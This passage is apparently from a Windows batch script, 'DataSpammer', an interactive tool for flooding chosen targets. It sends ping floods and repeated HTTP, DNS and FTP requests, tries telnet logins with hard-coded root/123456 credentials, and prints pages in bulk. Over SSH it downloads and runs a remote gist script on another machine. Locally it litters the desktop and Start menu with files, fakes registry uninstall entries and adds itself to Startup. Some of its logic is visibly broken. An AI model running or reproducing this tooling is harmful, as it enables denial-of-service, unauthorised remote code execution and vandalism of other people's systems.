        if %_erl%==2 goto desktop.icon.setup
        if %_erl%==3 goto autostart
    goto ad.setup



:autostart.delete
    net session >nul 2>&1
    if %errorLevel% NEQ 0 goto sys.script.administrator
    call :sys.lt 1
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    del autostart.bat
    echo Autostart Link Removed.
    echo Restarting Script...
    call :sys.lt 2
    goto restart.script

:autostart.setup.confirmed
    net session >nul 2>&1
    if %errorLevel% NEQ 0 goto sys.script.administrator
    call :sys.lt 1
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    set "varlinkauto=%~dp0"
    (
    echo @echo off
    echo cd /d %varlinkauto%
    dataspammer.bat
    ) > autostart.bat
    echo Autostart Link Added.
    echo Restarting Script...
    call :sys.lt 2
    goto restart.script

:desktop.icon.setup
    net session >nul 2>&1
    if %errorLevel% NEQ 0 goto sys.script.administrator
    cd /d %userprofile%\Desktop
    set "varlinkauto=%~dp0"
    (
    echo @echo off
    echo cd /d %varlinkauto%
    dataspammer.bat
    ) > DataSpammer.bat
    echo Added Desktop Icon
    echo Restarting Script...
    call :sys.lt 2
    goto restart.script

:desktop.icon.delete                                                                                                    
    net session >nul 2>&1
    if %errorLevel% NEQ 0 goto sys.script.administrator
    cd %userprofile%\Desktop
    del DataSpammer.bat
    echo Successfully Deleted Desktop Icon.
    echo Removed Desktop Icon
    echo Restarting Script...
    call :sys.lt 2
    goto restart.script


:autostart.settings.page
    echo.
    call :sys.lt 1
    echo If you have moved the Directory please Delete the Autostart and Then Set it up new
    call :sys.lt 1
    pause
    goto autostart.desktop.settings



::
::               /\            /\ 
::                |  SETTINGS  |  
::                |  SPAM PART |
::               \/            \/
::




:start
    if %logging% == 1 ( call :log Opened_Start )
    call :sys.verify.execution
    if %logging% == 1 ( call :log Start_Verified )
    cls
:start.verified
    echo [1] Local Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Protocol Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto local.spams
        if %_erl%==2 goto internet.spams
    goto start.verified





:internet.spams
    echo [1] SSH Test (no Password)
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] DNS Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] FTP Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] HTTP(S) Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [5] Printer Test
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [6] ICMP Test (ping)
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [7] Telnet (Older SSH)
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [8] Go Back
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo Tests in developement: SMTP (mail), IMAP (mail), 
    call :sys.lt 1
    echo.
    choice /C 12345678 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ssh.spam
        if %_erl%==2 goto dns.spam
        if %_erl%==3 goto ftp.spam
        if %_erl%==4 goto https.spam
        if %_erl%==5 goto printer.spam
        if %_erl%==6 goto icmp.spam
        if %_erl%==7 goto telnet.spam
        if %_erl%==8 goto start.verified
    goto internet.spams

:telnet.spam
    echo root > temp.txt
    echo 123456 >> temp.txt
    echo exit >> temp.txt

    if "%default-domain%"=="notused" set /P telnet.target=Enter the Target:
    if not "%default-domain%"=="notused" set "telnet.target=%default-domain%"
    
    if "%default-filecount%"=="notused" set /P telnet.count=How many Requests should be made
    if not "%default-filecount%"=="notused" set "telnet.count=default-domain"

    for /L %%i in (1,1,%telnet.count%) do (
        telnet %telnet.target% 23 < input.txt
    )
    
    del temp.txt
    if %logging% == 1 ( call :log Finished_Telnet_Spam_on_%telnet.target% )
    call :done "The Script Tested the Telnet Server %telnet.target% with %telnet.count% Requests


:icmp.spam
    if "%default-domain%"=="notused" set /P icmp.target=Enter the Target
    if not "%default-domain%"=="notused" set "icmp.target=%default-domain%"
    
    echo Press CTRL+C to stop
    @ping -n 3 localhost> nul
    ping %icmp.target% -f

    if %logging% == 1 ( call :log Finished_ICMP_Spam_on_%icmp.target% )
    call :done "The Script Tested %icmp.target% with %icmp.packet.size% Bytes Packets"

:local.spams
    echo Choose the Method you want to use:
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] .txt Spam in custom Directory
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Desktop Icon Spam
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Startmenu Spam
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] App-List Spam
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [5] Go Back
    echo.
    echo.
    echo.
    choice /C 12345 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto normal.text.spam
        if %_erl%==2 goto desktop.icon.spam
        if %_erl%==3 goto startmenu.spam
        if %_erl%==4 goto app.list.spam
        if %_erl%==5 goto start.verified
    goto local.spams


:printer.spam
:: print /D:%printer% %file%
:: set printer="\\NetworkPrinter\PrinterName"
    if "%default-filecount%"=="notused" set /P printer.count=How many Files should be printed
    if not "%default-filecount%"=="notused" set "printer.count=default-domain"

    if "%default-filename%"=="notused" set /P print.filename=Enter the Filename:
    if not "%default-filename%"=="notused" set "print.filename=%default-filename%"

    cls
    wmic printer get Name
    set /P printer-device=Choose a Device (full name):

    set /P printer.content=Enter the Content:
    cd /d %~dp0
    echo %printer.content% > %print.filename%.txt

    for /L %%i in (1,1,%printer.count%) do (
        print %print.filename%.txt
        print /D:"%printer-device%" %print.filename%.txt
    )
    if %logging% == 1 ( call :log Finished_Printer_Spam:%printer.count%_Requests_on_default_Printer )
    erase %print.filename%.txt
    call :done "The Script Created %printer.count% to Default Printer"



:https.spam
    echo Spam a HTTP/HTTPS Server with Requests
    if "%default-domain%"=="notused" set /P url=Enter a Domain or an IP:
    if not "%default-domain%"=="notused" set "url=default-domain"
    if "%default-filecount%"=="notused" set /P requests=How many requests should be made:
    if not "%default-filecount%"=="notused" set "requests=default-domain"

    setlocal enabledelayedexpansion
    for /L %%i in (1,1,%requests%) do (
        echo Sending Request %%i of %requests% to %url%
        curl -s -o NUL -w "Status: %{http_code}\n" !url!
    )

:https.done
    if %logging% == 1 ( call :log Finished_HTTPS_Spam:%requests%_Requests_on_%url% )
    call :done "The Script Created %requests% to %url%"


:dns.spam
    setlocal enabledelayedexpansion
    
    echo DNS-Spam is useful if you have a local DNS Server running (PiHole, Adguard etc.)
    set /P domain_server=Enter the DNS-Server IP (leave empty for default):
    if "%default-domain%"=="notused" set /P domain=Enter the Domain:
    if not "%default-domain%"=="notused" set "domain=%default-domain%"

    if "%default-filecount%"=="notused" set /P request_count=Enter the Request Count:
    if not "%default-filecount%"=="notused" set "request_count=%default-filecount%"
    
    if not defined domain_server set "domain_server= "
    
    cls
    echo Now enter the Record type. A for IPv4 and AAAA for IPv6. Use A if unsure.
    set /P record_type=Enter the DNS Record Type (A or AAAA):
    
    set /a x=1
    
    if /I "%record_type%"=="A" goto dns.a
    if /I "%record_type%"=="AAAA" goto dns.aaaa
    
    
:dns.a
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=A %domain% %domain_server% > nul
        cls
    )
    goto dns.done
    
:dns.aaaa
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=AAAA %domain% %domain_server% > nul
        cls
    )
    

:dns.done
    if %logging% == 1 ( call :log Finished_DNS_Spam:%request_count%_Requests_on_%domain_server% )
    call :done "The Script Created %request_count% for %domain% on %domain_server%"

    


:ftp.spam
    cls
    echo This Function spams any FTP-Server with Files.
    echo.
    set /P ftpserver=Enter a Domain or IP:
    set /P username=Enter the Username
    set /P password=Enter the Password
    set /P remoteDir=Enter the Directory (leave empty if unsure):

    if "%default-filename%"=="notused" set /P filename=Enter the Filename:
    if not "%default-filename%"=="notused" set "filename=%default-filename%"

    set /P content=Enter the File-Content:

    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "filecount=%default-filecount%"
    
    echo %content% > %filename%.txt
    
    :: Creates Files on local Machine
    echo Creating Files...
    set /a w=1
    cd %tmp%
    for /l %%i in (1,1,%filecount%) do (
        echo %content% >> %filename%%x%.txt
        set /a w+=1
    )
    
    :: Creates FTP Commands and writes them
    set ftpCommands=ftpcmd.txt
    echo open %ftpserver% > %ftpCommands%
    echo %username% >> %ftpCommands%
    echo %password% >> %ftpCommands%
    echo binary >> %ftpCommands%
    echo cd %remoteDir% >> %ftpCommands%
    
    echo Creating Commands...
    
    :: Writes multiple Files in Command List
    set /a x=1
    for /l %%i in (1,1,%filecount%) do (
        setlocal enabledelayedexpansion
        set localFile=%filename%!x!.txt
        echo put !localFile! >> %ftpCommands%
        set /a x+=1
        endlocal
    )
    
    echo bye >> %ftpCommands%
    ftp -n -s:%ftpCommands%
    del %ftpCommands%
    
    set /a y=1
    cd %tmp%
    for /l %%i in (1,1,%filecount%) do (
        erase %filename%%x%.txt
        set /a y+=1
    )
    
:ftp.done    
    if %logging% == 1 ( call :log Finished_FTP_Spam:_%filecount% )
    call :done "The Script Created %filecount% Files on the FTP Server: %ftpserver%"



:app.list.spam
    cls
    echo This Function will spam the Applist under "Settings > Apps > Installed Apps" with Items of your choice
    echo You can customise the Following Things:
    echo App Name
    echo App Version
    echo App Path
    echo Publisher
    echo.
    echo [1] Continue
    echo.
    echo [2] Go Back
    echo.
    echo.
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto app.list.spam.confirmed
        if %_erl%==2 goto start.verified
    goto app.list.spam

:app.list.spam.confirmed
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        echo Restarting Program as Elevated. Go here again manually.
        @ping -n 3 localhost> nul
        powershell -Command "Start-Process '%~f0' -Verb runAs"
        exit
    )

    echo Enter random to use random Numerals
    echo Enter default to skip an Option
    set /P app.spam.name=Enter the App Name:
    echo.
    set /P app.spam.app.version=Enter the App Version:
    echo.
    set /P app.spam.path=Enter the Path of the App (any File):
    echo.
    set /P app.spam.publisher=Enter the Publisher:
    echo.
    set /P app.spam.filecount=How many Entrys should be created:
    
    if %app.spam.name% == random set "app.spam.name=%random%"
    if %app.spam.app.version% == random set "app.spam.app.version=%random%"
    if %app.spam.path% == random set "app.spam.path=%~f0"
    if %app.spam.publisher% == random set "app.spam.publisher=%random%"
    if %app.spam.name% == default set "app.spam.name=DataSpammer"
    if %app.spam.app.version% == default set "app.spam.app.version=%current-script-version%"
    if %app.spam.path% == default set "app.spam.path=%~f0"
    if %app.spam.publisher% == default set "app.spam.publisher=DataSpammer"
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    )
    

:app.spam.start.top
    set /a x+=1

    reg add "%RegPath%" /v "DisplayName" /d "%app.spam.name%%x%" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%app.spam.app.version%" /f
    reg add "%RegPath%" /v "InstallLocation" /d "%app.spam.path%" /f
    reg add "%RegPath%" /v "Publisher" /d "%app.spam.publisher%" /f
    reg add "%RegPath%" /v "UninstallString" /d "%~f0" /f

    echo Created %x% Entry(s).
    if %x% equ %app.spam.filecount% (goto app.spam.done) else (goto app.spam.start.top)

:app.spam.done
    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% )
    call :done "The Script Created %x% Entrys."


:startmenu.spam
    echo How many Files should be created?
    set /P filecount=Type a Number here:
    echo Only for Local User or For All Users?
    echo All Users requires Admin Privileges.
    choice /C AL /M "(A)ll / (L)ocal"
    set _erl=%errorlevel%
    if %_erl%==A goto spam.all.user.startmenu
    if %_erl%==L goto spam.local.user.startmenu
    
:spam.local.user.startmenu
    set "directory1=%AppData%\Microsoft\Windows\Start Menu\Programs"
    if %default-filename% equ notused (goto startmenu.custom.name) else (goto startmenu.start)

:spam.all.user.startmenu
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        echo Restarting Program as Elevated. Go here again manually.
        @ping -n 2 localhost> nul
        powershell -Command "Start-Process '%~f0' -Verb runAs"
        exit
    )
    set "directory1=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
    if %default-filename% equ notused (goto startmenu.custom.name) else (goto startmenu.start)
    
:startmenu.custom.name
    cls
    echo Illegal Characters:\ / : * ? " < > |"
    set /p default-filename=Type in the Filename you want to use:

:startmenu.start
    cd %directory1%
    goto spam.ready.to.start

:ssh.spam
    if "%logging%"=="1" ( call :log Opened_SSH_Spam )
    :: Not working - TLI For ssh.spam
    echo In Order to work the Remote Spam Method needs 4 Things.
    @ping -n 1 localhost > nul
    echo 1: The IP of the Device you want to spam
    @ping -n 1 localhost > nul
    echo 2: An Accountname
    @ping -n 1 localhost > nul
    echo 3: The Password of the Account
    @ping -n 1 localhost > nul
    echo 4: How many Files you want to create
    @ping -n 1 localhost > nul
    echo.
    echo. 
    echo [1] Continue
    echo.
    echo [2] Back
    echo.
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ssh.spam.info
        if %_erl%==2 goto start.verified
    goto ssh.spam

:ssh.spam.info
    if "%logging%"=="1" ( call :log Listing_Local_IPs )
    :: Ask the User to enter the IP - supported with arp
    echo Please specify the IP of the Device
    @ping -n 1 localhost > nul
    echo Down Below are a Few IPs in your Network. 
    arp -a 
    @ping -n 1 localhost > nul
    echo If you need help finding the IP type "help"
    @ping -n 1 localhost > nul
    echo.
    @ping -n 1 localhost > nul
    echo.
    set /P ssh-ip=Enter the IP:
    if "%ssh-ip%"=="help" (
        start "" "https://support.ucsd.edu/services?id=kb_article_view&sysparm_article=KB0032480"
    ) else (
        goto ssh.spam.setup
    )

:ssh.spam.setup
    :: Enter other things needed for Remotespam
    set /P ssh-name=Enter an Account Name:
    rem set /P ssh-pswd=Enter the Password of the Account:
    set /P ssh-filecount=How many files do you want to create:
    call :sys.verify.execution
    cls

:ssh.start.spam
    echo Is the SSH Target based on Linux or Windows?
    echo.
    echo [1] Windows
    echo.
    echo [2] Linux
    echo.
    echo.
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.ssh.target.win
        if %_erl%==2 goto spam.ssh.target.lx
    goto ssh.start.spam

:spam.ssh.target.win
    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target )
    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
    ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
    color 02
    echo Successfully executed SSH Connection.
    goto ssh.done

:spam.ssh.target.lx
    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target )
    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %filecount%
    ssh %ssh-name%@%ssh-ip% %ssh_command%
    color 02
    echo Successfully executed SSH Connection.
    goto ssh.done


:ssh.done
    if %logging% == 1 ( call :log Finished_SSH_Spam_Files:_%ssh-filecount%_Host_%ssh-name% )
    call :done "The Script Created %ssh-filecount% Files on the Machine of %ssh-name%"

:desktop.icon.spam
    if %logging% == 1 ( call :log Opened_Desktop_Spam )

    if "%default-filename%"=="notused" set /p "desk.spam.name=Choose a Filename:"
    if not "%default-filename%"=="notused" set "desk.spam.name=%default-filename%"

    set /p desk.spam.format=Choose the Format (without the dot):
    set /p desk.spam.content=Enter the File-Content:

    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "desk.filecount=%default-filecount%"

    cls
    echo Starting.....
    @ping -n 2 localhost> nul
    cd /d %userprofile%\Desktop
    set /a x=1

    for /L %%i in (1,1,%desk.filecount%) do (
        echo Creating File %desk.spam.name%%x%.%desk.spam.format%
        echo %desk.spam.content% > %desk.spam.name%%x%.%desk.spam.format%
        set /a x+=1
    )

:done2
    if %logging% == 1 ( call :log Finished_Spamming_Files:_%deskspamlimitedvar% )
    call :done "The Script Created %deskspamlimitedvar% Files."


:normal.text.spam
    if %logging% == 1 ( call :log Opened_Normal_Spam )
    if not "%default_directory%"=="notused" cd /d %default_directory% && goto spam.directory.set
    set /p %default_directory%=Type Your Directory Here:

    if exist %default_directory% (
        echo goto sys.check.custom.name
    ) else (
        echo The Directory is invalid!
        pause
        goto spam.custom.directory
    )

:spam.directory.set
    if "%default-filename%"=="notused" set /P filename=Enter the Filename:
    if not "%default-filename%"=="notused" set "filename=%default-filename%"

    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "filecount=%default-filecount%"
    
    set /P defaultspam.content=Enter the File Content:
    
:spam.normal.top
    set /a x=1
    cd /d %default_directory%

    for /L %%i in (1,1,%filecount%) do (
        echo Creating File %default-filename%%x%.txt
        echo %defaultspam.content% > %default-filename%%x%.txt
        set /a x+=1
    )

    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% )
    call :done "The Script Created %filecount% Files."



    :: Display Help Dialog
:help.startup
    echo.
    echo.
    echo Dataspammer: 
    echo    Script to stress-test various Protocols or Systems
    echo    Made for educational Purposes only.
    echo.
    echo Usage dataspammer [Argument]
    echo       dataspammer.bat [Argument]
    echo.
    echo Parameters: 
    echo    help Show this Help Dialog
    echo.
    echo    update Check for Updates and exit afterwards
    echo.
    echo    faststart Start the Script without checking for Anything 
    echo.
    echo    remove Remove the Script and its components from your System
    echo.
    echo    start Directly start a Spam Method
    echo.
    echo    api Call the Scripts API and get a Plain-Text response (currently in Alpha)
    echo.
    echo    cli Use the Scripts CLI Interface (currently in Alpha)
    echo.
    echo    noelev Start the Script without Administrator
    echo.
    echo    debug Generate Debug Log
    echo.
    echo.

    exit /b 1464

    :: Whitout the UD stuff
:fast.git.update
    set "current-script-version=v3.6"
    set "owner=PIRANY1"
    set "repo=DataSpammer"
    set "api_url=https://api.github.com/repos/%owner%/%repo%/releases/latest"
    echo Fetching Data...
    cd %temp%
    curl -s %api_url% > apianswer.txt
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"

    if "%latest_version%" equ "%current-script-version%" (
        echo The Script is up-to-date [Version:%latest_version%]
    ) else (
        echo Your Script is outdated [Newest Version: %latest_version% Script Version:%current-script-version%]
    )
    del apianswer.txt
    cd /d %~dp0
    exit /b 0

:custom.go
   if %logging% == 1 ( call :log Opened_Custom_GOTO ) 
   if "%1"=="go" goto custom.go
   set "custom.goto.location=%2"
   goto %custom.goto.location%


:sys.delete.script
    if %logging% == 1 ( call :log Opened_Delete_Script )
    :: Delete Script TLI
    echo. 
    call :sys.lt 1
    echo You are about to delete the whole script.
    call :sys.lt 1 
    echo Are you sure about this decision?
    call :sys.lt 1
    echo If the script is bugged or you want to download the new Version please Visit the GitHub Repo
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Yes, Delete the Whole Script
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Open the Github-Repo
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] No Go Back
    call :sys.lt 1
    echo.
    echo.
    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto sys.delete.script.check.elevation
        if %_erl%==2 explorer "https://github.com/PIRANY1/DataSpammer" && goto sys.delete.script
        if %_erl%==3 goto cancel
    goto sys.delete.script

:sys.delete.script.check.elevation
    :: Check if Script is elevated
    setlocal enableextensions ENABLEDELAYEDEXPANSION 
    net session >nul 2>&1
    if %errorLevel% == 0 (goto sys.delete.script.confirmed) else (goto sys.script.administrator)
   
:sys.delete.script.confirmed
    if %logging% == 1 ( call :log Deleting_Script )
    :: Delete Script 
    if exist "%~dp0\LICENSE" del "%~dp0\LICENSE"
    echo 1/7 Files Deleted
    call :sys.lt 1
    if exist "%~dp0\README.md" del "%~dp0\README.md"
    echo 2/7 Files Deleted
    call :sys.lt 1
    if exist "%~dp0\dataspammer.bat" del "%~dp0\dataspammer.bat"
    echo 3/7 Files Deleted
    call :sys.lt 1
    if exist "%~dp0\install.bat" del "%~dp0\install.bat"
    echo 4/7 Files Deleted
    cd /d C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    if exist "autostart.bat" del "autostart.bat"
    echo 5/7 Files Deleted
    call :sys.lt 1
    cd /d %userprofile%\Desktop
    if exist "Dataspammer.bat" del "Dataspammer.bat"
    echo 6/7 Files Deleted
    call :sys.lt 1
    set "startMenuPrograms=%ProgramData%\Microsoft\Windows\Start Menu\Programs"
    cd /d %startMenuPrograms%
    if exist "Dataspammer.bat" del "Dataspammer.bat"
    echo 7/7 Files Deleted
    echo Uninstall Successfull
    
:sys.script.administrator
    :: Script isnt elevated TLI
    echo Please start the Script as Administrator in order to install.
    echo To do this right click the Dataspammer File and click "Run As Administrator"
    echo The Explorer Windows with the Script will open in 5 Seconds
    timeout 5
    explorer %~dp0
    exit 0

:restart.script
    if %logging% == 1 ( call :log Restarting_Script )
    cd %~dp0
    dataspammer.bat
    exit restarted.script

:sys.cli
    if %logging% == 1 ( call :log Opened_CLI )
    @echo off
    for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
    echo Type 'help' to get an overview of commands
    :sys.cli.input
    echo.
    echo  [97m???[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m] - [[94m%time% %date%[0m]
    set /p cmd=".%BS% [97m???>[0m "
    echo.
    %cmd%
    goto sys.cli.input

:sys.api
    echo This Feature is in Active Developement!
    exit /b api.dev.active



:sys.lt
    set "dur=%1"
    @ping -n %dur% localhost> nul
    exit /b 0

:log
    :: call scheme is:
    :: if %logging% == 1 ( call :log Opened_verify_tab )
    :: _ and - are getting Replaced by Space    

    set "log.content=%1"
    set "logfile=DataSpammer.log"
    
    :: Check Folder Structure
    set "folder=%userprofile%\Documents\DataSpammerLog"
    if not exist "%folder%" (
        mkdir "%folder%"
    )
    
    set "log.content.clean=%log.content%"
    set log.content.clean=%log.content.clean:_= %
    set log.content.clean=%log.content.clean:-= %

    echo %date% %time% %log.content.clean% >> "%folder%\%logfile%"
    :: exit
    exit /b 0
    
    :: Fix this Part Sometimes / Content not gets written
        :: convert time and date to readable format
        ::setlocal enabledelayedexpansion
        ::for /f "tokens=1-3 delims=:," %%a in ("%currentTime%") do (
        ::    set "hours=%%a"
        ::    set "minutes=%%b"
        ::    set "seconds=%%c"
        ::)
        ::set "seconds=!seconds:~0,2!" 
        ::set "formattedTime=!hours!:!minutes!:!seconds!"
        
        :: Write Log
        ::echo !currentDate! !formattedTime! %log.content% >> "%folder%\%logfile%"


:update_config
    :: Example for Interactive Change
    :: call :update_config "default-filename" "Type in the Filename you want to use." ""
    
    :: Example for Automated Change
    :: call :update_config "logging" "" "1"
    
    :: Parameter 1: Value (logging etc.)
    :: Parameter 2: User Choice (interactive prompt, empty for automated)
    :: Parameter 3: New Value (leave empty for user input)
    
    setlocal enabledelayedexpansion
    cd /d %~dp0
    
    set "key=%~1"
    set "prompt=%~2"
    set "new_value=%~3"

    if "%new_value%"=="" (
        set /p new_value=%prompt%
    )
    
    set "file=settings.conf"
    set "tmpfile=temp.txt"
    set linenumber=0
    
    (for /f "tokens=1,* delims==" %%a in (!file!) do (
        if "%%a"=="%key%" (
            set found=1
            echo %%a=!new_value!
        ) else (
            echo %%a=%%b
        )
    )) > !tmpfile!
    
    if !found!==0 (
        echo %key%=%new_value% >> !tmpfile!
    )

    if !logging!==1 ( call :log Changing_%key% )
    cls
    endlocal
    goto :eof
    

:done
    cls
    echo.
    %$Echo% "   ____        _        ____                                           
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  
    %$Echo% "                             |_|                                                                    


    
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo %~1
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo Do you want to Close the Script or Go to the Menu?
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Close
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Menu
    echo.
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto cancel
        if %_erl%==2 goto menu
    goto done

:dev.options 
    echo %~nx0 / %~0
    echo %~dpnx0
    title Developer Options DataSpammer
    :: Rework In Process.
    echo Dev Tools
    echo.
    echo [1] Goto Specific Call Sign
    echo.
    echo [2] -
    echo.
    echo [3] @ECHO ON
    echo.
    echo [4] Set a Variable 
    echo.
    echo [5] Restart the Script (Variables will be kept)
    echo.
    echo [6] Restart the Script (Variables wont be kept)
    choice /C 123456 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto dev.jump.callsign
        if %_erl%==2 goto dev.options
        if %_erl%==3 @ECHO ON && goto restart.script
        if %_erl%==4 goto dev.custom.var.set 
        if %_erl%==5 goto restart.script.dev
        if %_erl%==6 goto restart.script
    goto dev.options

:dev.goto
    goto %2

:dev.jump.callsign
    echo In which Script you want go to
    echo [1] DataSpammer.bat
    echo [2] Install.bat
    echo. 
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto dev.jump.callsign.dts
        if %_erl%==2 goto dev.jump.callsign.install
    goto dev.jump.callsign


:dev.jump.callsign.dts
    set /P jump-to-call-sign=Enter a Call Sign:
    goto %jump-to-call-sign%


:dev.jump.callsign.install
    cd /d %~dp0
    set /P jump-to-call-sign=Enter a Call Sign:
    install.bat go %jump-to-call-sign%




:sys.new.update.installed
    set "config_file=settings.conf"
    for /f "usebackq tokens=1,2 delims==" %%a in (`findstr /v "^::" "%config_file%"`) do (
        set "%%a=%%b"
    )

    if not defined %default_filename% call :update_config "default_filename" "" "notused"
    if not defined %default-domain% call :update_config "default-domain" "" "notused"
    if not defined %default-filecount% call :update_config "default-filecount" "" "notused"
    if not defined %developermode% call :update_config "developermode" "" "0"
    if not defined %logging% call :update_config "logging" "" "1"
    if not defined %default_directory% call :update_config "default_directory" "" "notused"
    if not defined %elevation% call :update_config "elevation" "" "pwsh"
    echo Updating Settings...
    call :sys.lt 1    
    goto sys.settings.patched


:sys.settings.patched
    :: Update Installed TLI
    echo Update was Successful!
    call :sys.lt 1
    echo Updated to %latest_version%
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Open Script
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Exit
    call :sys.lt 1
    echo.
    echo.
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto restart.script
        if %_erl%==2 goto cancel
    goto sys.new.update.installed



:: Maybe add Option to add New Directory

:debuglog
    echo Generating Debug Log
    cd %~dp0
    set SOURCE_DIR="%script.dir%\Debug"
    mkdir Debug
    :: More Content here ::
    copy "%userprofile%\Documents\DataSpammerLog\DataSpammer.log" "%SOURCE_DIR%"
    ipconfig > ipconf.txt
    msinfo32 /report %cd%\msinfo.txt
    ipconfig /renew /flushdns
    driverquery /FO list /v > drivers.txt
    set ZIP_FILE="%script.dir%\debug.log.zip"
    tar -a -cf "%ZIP_FILE%" -C "%SOURCE_DIR%" .

:debug.done
    echo Successfully Generated debug.log.zip
    echo. 
    echo [1] Copy to Clipboard
    echo.
    echo [2] Open GitHub Repository
    echo. 
    echo [3] Go Back
    echo.
    echo.
    set /P debuglog=Choose an Option from Above
    choice /C 123 /M "Choose an Option from Above:"
    set _erl=%errorlevel%
    if %_erl%==1 echo %ZIP_FILE% | clip && cls && echo Copied debug.log.zip to your Clipboard && pause
    if %_erl%==2 explorer "https://github.com/PIRANY1/DataSpammer/issues"
    if %_erl%==3 goto advanced.options
    goto debug.done
    
    :: Collect Functionalities HERE..
    :: DNS & HTTPS & Basic Filespam 
:debugtest
    echo Running Debug Test...
    echo %time%
    call :sys.lt 10
    echo %time%
    call :log Tested_Functionality
    type %userprofile%\Documents\DataSpammerLog\Dataspammer.log

    :: Paste Newly Added Functions of your PR here to test them via Git

    echo Finished Testing...
    echo Exiting
    goto cancel

:sys.verify.execution
    if %logging% == 1 ( call :log Opened_verify_tab )
    set "verify=%random%"
    powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
    set /p OUT=<%TEMP%\out.tmp
    if %verify%==%OUT% (goto success) else (goto failed)

:success
